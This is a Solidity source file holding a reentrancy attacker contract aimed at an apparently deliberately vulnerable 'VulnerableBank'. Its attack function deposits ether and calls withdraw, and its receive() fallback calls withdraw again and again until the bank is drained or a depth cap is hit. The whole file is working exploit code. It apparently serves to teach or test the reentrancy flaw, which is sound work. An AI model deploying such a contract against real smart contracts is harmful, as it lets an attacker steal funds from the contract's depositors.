// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

interface IVulnerableBank {
    function deposit() external payable;
    function withdraw() external;
}

/// @notice Minimal attacker contract that reenters VulnerableBank.withdraw.
contract ReentrancyAttacker {
    IVulnerableBank public immutable bank;
    uint256 public reentryCount;
    uint256 public maxReentries;

    constructor(address bankAddress) {
        bank = IVulnerableBank(bankAddress);
    }

    function attack(uint256 maxDepth) external payable {
        require(msg.value > 0, "need ether");
        maxReentries = maxDepth;
        bank.deposit{value: msg.value}();
        bank.withdraw();
    }

    receive() external payable {
        if (address(bank).balance > 0 && reentryCount < maxReentries) {
            reentryCount++;
            bank.withdraw();
        }
    }
}
